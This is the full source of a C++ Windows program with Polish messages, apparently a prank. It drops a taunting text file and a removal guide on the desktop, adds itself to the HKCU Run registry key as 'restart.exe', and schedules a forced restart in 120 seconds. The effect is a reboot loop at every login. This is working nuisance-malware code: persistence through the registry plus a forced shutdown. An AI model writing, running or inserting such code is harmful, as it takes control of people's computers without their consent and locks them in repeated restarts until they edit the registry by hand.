#include <iostream>
#include <fstream>
#include <cstdlib>
#include <windows.h>
#include <shlobj.h>
#include <string>

using namespace std;

int main() {
    char desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
        string filePath1 = string(desktopPath) + "\\Get Shutdown'ed.txt";
        ofstream outFile1(filePath1);
        if (outFile1.is_open()) {
            outFile1 << "Hehe";
            outFile1.close();
            cout << "Plik 'Get Shutdown'ed.txt' utworzony na pulpicie.\n";
        } else {
            cerr << "Nie udało się utworzyć pliku 'Get Shutdown'ed.txt'.\n";
        }

        string filePath2 = string(desktopPath) + "\\Instrukcja do wyrzucenia z autostartu.txt";
        ofstream outFile2(filePath2);
        if (outFile2.is_open()) {
            outFile2 << "Windows:" << "\n";
            outFile2 << "Wciśnij Win + R, wpisz regedit. Przejdź do:" << "\n";
            outFile2 << "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << "\n";
            outFile2 << "Znajdź restart.exe, kliknij prawym, a następnie usuń." << "\n";
            outFile2.close();
            cout << "Plik 'Instrukcja...' utworzony na pulpicie.\n";
        } else {
            cerr << "Nie udało się utworzyć pliku instrukcji.\n";
        }
    } else {
        cerr << "Nie udało się pobrać ścieżki pulpitu.\n";
    }

    char appPath[MAX_PATH];
    GetModuleFileName(NULL, appPath, MAX_PATH);

    string regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v restart.exe /d \"" + string(appPath) + "\" /f";
    system(regCommand.c_str());
    cout << "Program dodany do autostartu.\n";

    cout << "Restart komputera za 2 minuty...\n";
    system("shutdown /r /t 120");

    return 0;
}